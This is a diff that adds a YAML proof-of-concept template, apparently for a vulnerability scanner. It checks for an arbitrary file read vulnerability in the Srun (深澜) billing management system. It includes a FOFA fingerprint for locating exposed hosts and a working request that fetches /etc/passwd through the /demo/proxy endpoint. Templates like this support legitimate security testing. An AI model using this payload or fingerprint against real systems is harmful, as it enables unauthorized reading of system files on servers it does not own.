@@ -1,0 +1,15 @@
+id: poc-yaml-srun-proxy-anyfile-read
+info:
+  name: 深澜计费管理系统 proxy 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 深澜计费管理系统
+  fofa: icon_hash="-1546320596"
+requests:
+- method: GET
+  path: /demo/proxy?url=file:///etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"<response>") && contains(content_type,"application/xml")
+variables: {}
+transport: http
